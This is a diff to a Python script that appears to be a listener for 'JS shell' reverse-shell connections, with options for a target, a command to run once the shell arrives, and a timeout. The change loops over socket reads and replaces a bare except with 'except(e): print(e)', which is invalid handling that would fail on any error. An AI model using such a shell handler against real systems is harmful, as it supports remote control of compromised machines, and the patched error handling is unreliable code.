@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 import socket
 import sys
-from requests import get
 import argparse
+
+from requests import get
 
 
 red = '\033[1;31m'
@@ -36,7 +37,6 @@ parser.add_argument('-t', help='target to be used in payloads, default: [host]:[
 parser.add_argument('-c', help='command to execute after get the shell', dest='command', default=str())
 parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
 parser.add_argument('-q', help='quiet mode', dest='quiet', action='store_true')
-
 
 args = parser.parse_args()
 
@@ -174,14 +174,20 @@ def main():
 
     try:
         c, addr = s.accept()
-        resp = c.recv(1024).decode()
+        resp = ""
+        while True:
+            b = c.recv(1024).decode()
+            if not b:
+                break
+            resp += b
     except KeyboardInterrupt:
         if sys.platform == 'win32':
                 print('\nControl-C')
         exit()
-    except:
+    except(e):
+        print(e)
         s.close()
-        main()
+        
 
     if 'Accept' in resp and 'HTTP' in resp:
         print('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
